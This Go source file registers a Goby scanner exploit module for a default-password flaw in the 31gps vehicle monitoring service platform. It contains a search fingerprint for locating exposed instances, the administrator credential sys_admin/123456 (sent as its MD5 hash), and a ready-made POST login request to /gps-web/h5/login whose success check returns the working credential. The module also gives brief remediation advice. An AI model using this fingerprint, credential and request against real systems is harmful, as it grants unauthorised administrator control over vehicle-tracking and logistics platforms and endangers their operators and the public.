package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Vehicle monitoring service platform default password vulnerability",
    "Description": "<p>Vehicle monitoring service platform relies on mobile communication network and Internet, combined with the advantages of BS architecture, to provide logistics, freight, passenger transport industry exclusive services. Realize the supervision, scheduling, statistical analysis and other management of transportation vehicles based on location information, facilitate the management of vehicle operation routes and areas, provide security for dangerous goods transportation, facilitate safe vehicle speed management regulate passenger operation, effectively strengthen the management of vehicles by management departments.</p><p>Vehicle monitoring service platform exists system administrator default password, the attacker can use the default password sys_admin/123456 to log into the system background, the vehicle monitoring service platform for arbitrary operation.</p>",
    "Product": "31gps-Vehicle monitoring service platform",
    "Homepage": "http://www.31gps.net/",
    "DisclosureDate": "2022-11-02",
    "Author": "Pannet-v5",
    "FofaQuery": "body=\"gps-web\" && body=\"<title>欢迎光临\"",
    "GobyQuery": "body=\"gps-web\" && body=\"<title>欢迎光临\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/gps-web/h5/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"loginType\":\"user\",\"userId\":\"sys_admin\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\",\"rsaId\":null,\"plateColor\":\"1\",\"smsCode\":null,\"code\":[{\"x\":1122,\"y\":462,\"t\":92474},{\"x\":1177,\"y\":454,\"t\":22},{\"x\":1219,\"y\":449,\"t\":19},{\"x\":1293,\"y\":445,\"t\":17},{\"x\":1350,\"y\":445,\"t\":22},{\"x\":1384,\"y\":447,\"t\":25}],\"codeId\":\"668232fc6a0447d1b768365c2240e74d\",\"loginLang\":\"zh_CN\",\"loginWay\":\"ie\",\"h5login\":true}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ok",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\":1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/gps-web/h5/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "{\"loginType\":\"user\",\"userId\":\"sys_admin\",\"password\":\"e10adc3949ba59abbe56e057f20f883e\",\"rsaId\":null,\"plateColor\":\"1\",\"smsCode\":null,\"code\":[{\"x\":1122,\"y\":462,\"t\":92474},{\"x\":1177,\"y\":454,\"t\":22},{\"x\":1219,\"y\":449,\"t\":19},{\"x\":1293,\"y\":445,\"t\":17},{\"x\":1350,\"y\":445,\"t\":22},{\"x\":1384,\"y\":447,\"t\":25}],\"codeId\":\"668232fc6a0447d1b768365c2240e74d\",\"loginLang\":\"zh_CN\",\"loginWay\":\"ie\",\"h5login\":true}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ok",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|sys_admin:123456"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        " "
    ],
    "CNVD": [
        " "
    ],
    "CVSSScore": " 5.0",
    "Translation": {
        "CN": {
            "Name": "车辆监控服务平台 默认口令漏洞",
            "Product": "三一谦成-车辆监控服务平台",
            "Description": "<p>车辆监控服务平台依托移动通讯网络和互联网，结合BS架构优势，提供物流、货运、客运行业的专属服务。实现对运输车辆基于位置信息的监管、调度、统计分析等管理，方便对车辆运行路线和区域进行管理，对危险品运输提供安全保障，便于安全车速管理规范客运运营，有效加强管理部门对车辆的管理。</p><p>车辆监控服务平台存在系统管理员默认口令，攻击者可利用默认口令 sys_admin/123456登录系统后台，对车辆监控服务平台进行任意操作。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Vehicle monitoring service platform default password vulnerability",
            "Product": "31gps-Vehicle monitoring service platform",
            "Description": "<p>Vehicle monitoring service platform relies on mobile communication network and Internet, combined with the advantages of BS architecture, to provide logistics, freight, passenger transport industry exclusive services. Realize the supervision, scheduling, statistical analysis and other management of transportation vehicles based on location information, facilitate the management of vehicle operation routes and areas, provide security for dangerous goods transportation, facilitate safe vehicle speed management regulate passenger operation, effectively strengthen the management of vehicles by management departments.</p><p>Vehicle monitoring service platform exists system administrator default password, the attacker can use the default password sys_admin/123456 to log into the system background, the vehicle monitoring service platform for arbitrary operation.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}